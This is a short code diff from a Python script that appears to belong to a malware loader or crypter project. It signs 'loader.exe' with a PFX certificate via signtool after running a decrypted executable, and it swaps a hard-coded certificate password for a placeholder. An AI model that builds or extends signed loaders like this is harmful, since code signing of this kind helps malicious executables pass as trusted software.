@@ -92,7 +92,7 @@ subprocess.call('decrypted.exe', shell=True)
 
     # Sign the loader executable
     cert_file_path = os.path.abspath('mycert.pfx')
-    cert_password = "Owned"
+    cert_password = "YOURPASSHERE" #Replace with your digicert password you used to extract!
     timestamp_url = "http://timestamp.digicert.com"
     signtool_path = "C:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\signtool.exe"  # Please replace this path with the path to your signed tool
     loader_file_path = os.path.abspath('loader.exe')
